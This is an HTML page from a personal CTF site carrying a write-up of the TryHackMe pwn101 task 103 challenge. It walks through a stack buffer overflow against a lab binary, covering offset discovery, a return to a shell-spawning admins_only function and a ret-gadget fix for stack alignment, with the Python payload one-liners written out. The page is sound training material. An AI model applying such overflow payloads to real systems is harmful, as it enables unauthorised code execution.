@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>0xb0tm4n&#x27;s website</title>
+  <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"
+    integrity="sha256-WCzAhd2P6gRJF9Hv3oOOd+hFJi/QJbv+Azn4CGB8gfY=" crossorigin="anonymous" defer></script>
+  <script src="/js/index.js" defer></script>
+  <script src="/js/prompt.js" defer></script>
+  <script src="/js/keyboard.js" defer></script>
+  <script src="/js/tab.js" defer></script>
+  <script src="/js/commands.js" defer></script>
+  <script src="/js/config.js" defer></script><link rel="stylesheet" href="/css/base.css"><link rel="stylesheet" href="/css/page.css"></head><body onkeydown='exec(event)' style='background-image: url("/assets/background.jpg");'><main>
+      <div class="files" id="files" tabindex="0">
+<ul>
+  <li class="file">
+    <span><a href='https://super-botman.github.io/readme/'
+      tabindex="0">  README</a></span>
+  </li>
+
+<li class="folder"><span>
+      <a href='https://super-botman.github.io/pwn/'
+        tabindex="0">  Pwn
+      </a>
+    </span>
+
+    <ul>
+      
+      
+        
+        
+          
+<li>
+<span>└──
+  <a href='https://super-botman.github.io/pwn/writeups/'
+    tabindex="0">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+
+  
+  <li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/robot/'
+        tabindex="0">  FCSC 2023 | Robot</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/bigorneau/'
+        tabindex="0">  FCSC 2025 | Bigorneau</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/http3/'
+        tabindex="0">  FCSC 2025 | HTTP3</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/small-prime-shellcode/'
+        tabindex="0">  FCSC 2025 | Small Prime Shellcode</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/aarchibald/'
+        tabindex="0">  Hackropole | Aarchibald</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/alfred/'
+        tabindex="0">  Hackropole | Alfred</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/armigo/'
+        tabindex="0">  Hackropole | Armigo</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a class="selected"href='https://super-botman.github.io/pwn/writeups/pwn103/'
+        tabindex="0">  THM | pwn101 task 103</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li><li class="folder"><span>
+      <a href='https://super-botman.github.io/web/'
+        tabindex="0">  Web
+      </a>
+    </span>
+
+    <ul>
+      
+      
+        
+        
+          
+<li>
+<span>└──
+  <a href='https://super-botman.github.io/web/writeups/'
+    tabindex="0">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+
+  
+  <li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/web/writeups/boiler/'
+        tabindex="0">  THM | Boiler</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/web/writeups/thomghost/'
+        tabindex="0">  THM | Thomghost</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li>
+</ul>
+</div>
+      <div class="viewer page" id="viewer" tabindex="0">
+        <div class="tab">
+<div class="file-manager" onclick='document.getElementById("files").classList.toggle("open"); document.getElementById("content").classList.toggle("close")'> </div>
+<ul id="tabs">
+</ul>
+
+
+</div>
+        <div class="content" id="content"><h1 id="how-to-exploit-103-task-from-the-room-pwn101">How to exploit 103 task from the room pwn101 ?</h1>
+<h2 id="exploit">exploit</h2>
+<pre data-lang="bash" style="background-color:#1a1b26;color:#c0caf5;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#7aa2f7;">python3</span><span style="color:#89ddff;"> -</span><span style="color:#e0af68;">c </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">open(&#39;payload&#39;,&#39;wb&#39;).write(b&#39;A&#39;*32 + b&#39;B&#39;*8 + b&#39;\xec\x16\x40\x00\x00\x00\x00\x00&#39; + b&#39;\x54\x15\x40\x00\x00\x00\x00\x00&#39;)</span><span style="color:#89ddff;">&quot;
+</span><span style="color:#89ddff;">(</span><span style="color:#2ac3de;">echo </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">3\n</span><span style="color:#89ddff;">&quot;</span><span style="color:#bb9af7;">; </span><span style="color:#7aa2f7;">cat payload</span><span style="color:#bb9af7;">; </span><span style="color:#7aa2f7;">cat</span><span style="color:#89ddff;">) </span><span style="color:#bb9af7;">| </span><span style="color:#7aa2f7;">./pwn103.pwn103
+</span></code></pre>
+<h2 id="why">Why ?</h2>
+<p>begin with the begining, find the vector:</p>
+<ul>
+<li>check the first input</li>
+<li>check the others possibilities of the menu</li>
+</ul>
+<p>so, let's check the first input after the try of adding a lot of 'A' we don't find the vector here now, let check the others menu:</p>
+<ol>
+<li>Announcements: juste some text so not input</li>
+<li>Rules: same as Announcements</li>
+<li>Général: check with a lot of 'A' and let's go ! we find the enter !</li>
+</ol>
+<p>now, let's exploit !</p>
+<h3 id="find-the-size-of-the-buffer">find the size of the buffer</h3>
+<p>we're going to find the size of the buffer by using <code>msf-pattern</code> and <code>gdb-peda</code>:</p>
+<pre data-lang="bash" style="background-color:#1a1b26;color:#c0caf5;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#7aa2f7;">msf-pattern_create</span><span style="color:#89ddff;"> -</span><span style="color:#e0af68;">l</span><span style="color:#7aa2f7;"> 100
+</span></code></pre>
+<p>then run gdb peda:
+<img src="/images/pwn103/gdb.png" alt="gdb peda screenshot" /></p>
+<p>the use msf-patter_offset:</p>
+<pre data-lang="bash" style="background-color:#1a1b26;color:#c0caf5;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#7aa2f7;">msf-pattern_offset</span><span style="color:#89ddff;"> -</span><span style="color:#e0af68;">q</span><span style="color:#7aa2f7;"> 0x4132624131624130
+</span></code></pre>
+<h3 id="find-interesting-functions">find interesting functions</h3>
+<p>and we find that the buffer has a size of 32 or 0x20 bytes now, we have to find how to exploit let's open cutter to find some intersting funtions or others:</p>
+<p><img src="/images/pwn103/cutter.png" alt="cutter admins_only function decompiled" /></p>
+<p>so, we finds the function admins_only who give a shell a the adress <code>0x00401554</code></p>
+<h2 id="pwn">PWN !</h2>
+<p>now we have all to exploit:</p>
+<ul>
+<li>buffer size</li>
+<li>function to call</li>
+</ul>
+<h3 id="let-s-build-the-exploit">let's build the exploit !</h3>
+<p>payload = buffer_size + 8bytes to write into the RSP registre + admins_only adress</p>
+<p>let's try it !</p>
+<pre data-lang="bash" style="background-color:#1a1b26;color:#c0caf5;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#7aa2f7;">python3</span><span style="color:#89ddff;"> -</span><span style="color:#e0af68;">c </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">open(&#39;payload&#39;,&#39;wb&#39;).write(b&#39;A&#39;*32 + b&#39;B&#39;*8 + b&#39;\x54\x15\x40\x00\x00\x00\x00\x00&#39;)</span><span style="color:#89ddff;">&quot;
+</span><span style="color:#89ddff;">(</span><span style="color:#2ac3de;">echo </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">3\n</span><span style="color:#89ddff;">&quot;</span><span style="color:#bb9af7;">; </span><span style="color:#7aa2f7;">cat payload</span><span style="color:#bb9af7;">; </span><span style="color:#7aa2f7;">cat</span><span style="color:#89ddff;">) </span><span style="color:#bb9af7;">| </span><span style="color:#7aa2f7;">./pwn103.pwn103 
+</span></code></pre>
+<p>saddly, it's didn't work...</p>
+<p><img src="/images/pwn103/fail.png" alt="fails screenshot" /></p>
+<p>So why ?!
+it's because the movaps issue: <a href="https://ropemporium.com/guide.html">link to a ressource</a><br />
+the solution from the website:</p>
+<pre style="background-color:#1a1b26;color:#c0caf5;"><code><span>The MOVAPS issue
+</span><span>If you&#39;re segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.
+</span></code></pre>
+<p>so, let's find a ret intruction and add it into our payload</p>
+<h3 id="find-a-ret-instruction">find a ret instruction</h3>
+<p>let's use <code>ROPgadget</code> to find a ret instruction:</p>
+<pre data-lang="bash" style="background-color:#1a1b26;color:#c0caf5;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#7aa2f7;">ROPgadget</span><span style="color:#89ddff;"> --</span><span style="color:#e0af68;">binary</span><span style="color:#7aa2f7;"> pwn103.pwn103 </span><span style="color:#bb9af7;">| </span><span style="color:#7aa2f7;">grep ret
+</span></code></pre>
+<p><img src="/images/pwn103/ROPgadget.png" alt="ROPgadget tool to find gadgets screenshot" /></p>
+<p>so let's add <code>0x0000000000401016</code> to the payload</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>new payload = buffer_size + 8bits to write into the RSP registre + ret_adress + admins_only adress</p>
+<pre data-lang="bash" style="background-color:#1a1b26;color:#c0caf5;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#7aa2f7;">python3</span><span style="color:#89ddff;"> -</span><span style="color:#e0af68;">c </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">open(&#39;payload&#39;,&#39;wb&#39;).write(b&#39;A&#39;*32 + b&#39;B&#39;*8 + b&#39;\xec\x16\x40\x00\x00\x00\x00\x00&#39; + b&#39;\x54\x15\x40\x00\x00\x00\x00\x00&#39;)</span><span style="color:#89ddff;">&quot;
+</span><span style="color:#89ddff;">(</span><span style="color:#2ac3de;">echo </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">3\n</span><span style="color:#89ddff;">&quot;</span><span style="color:#bb9af7;">; </span><span style="color:#7aa2f7;">cat payload</span><span style="color:#bb9af7;">; </span><span style="color:#7aa2f7;">cat</span><span style="color:#89ddff;">) </span><span style="color:#bb9af7;">| </span><span style="color:#7aa2f7;">./pwn103.pwn103
+</span></code></pre>
+<p><img src="/images/pwn103/exploit.png" alt="successfull exploit execution" /></p>
+<p>GG !</p>
+<h2 id="ps">PS:</h2>
+<p>After viewing a stream of <a href="https://twitch.tv/topklean">topklean</a> i see another solution without bypass the MOVAPS issue:</p>
+<pre data-lang="bash" style="background-color:#1a1b26;color:#c0caf5;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#7aa2f7;">python3</span><span style="color:#89ddff;"> -</span><span style="color:#e0af68;">c </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">open(&#39;payload&#39;,&#39;wb&#39;).write(b&#39;A&#39;*32 + b&#39;B&#39;*8 + b&#39;\x7a\x15\x40\x00\x00\x00\x00\x00&#39;)</span><span style="color:#89ddff;">&quot;
+</span><span style="color:#89ddff;">(</span><span style="color:#2ac3de;">echo </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">3\n</span><span style="color:#89ddff;">&quot;</span><span style="color:#bb9af7;">; </span><span style="color:#7aa2f7;">cat payload</span><span style="color:#bb9af7;">; </span><span style="color:#7aa2f7;">cat</span><span style="color:#89ddff;">) </span><span style="color:#bb9af7;">| </span><span style="color:#7aa2f7;">./pwn103.pwn103
+</span></code></pre>
+
+        </div>
+      </div>
+      <div class="prompt" id="terminal"><input
+    type="text"
+    id="setter"
+    onkeydown="writeit(this, event);moveIt(this.value.length, event)"
+    onchange="writeit(this, event)"
+    onkeyup="writeit(this, event)"
+    onkeypress="writeit(this, event);"
+    >
+<label for="setter" id="writer"> </label><b class="cursor" id="cursor"></b></div>
+    </main>
+  </body>
+
+</html>
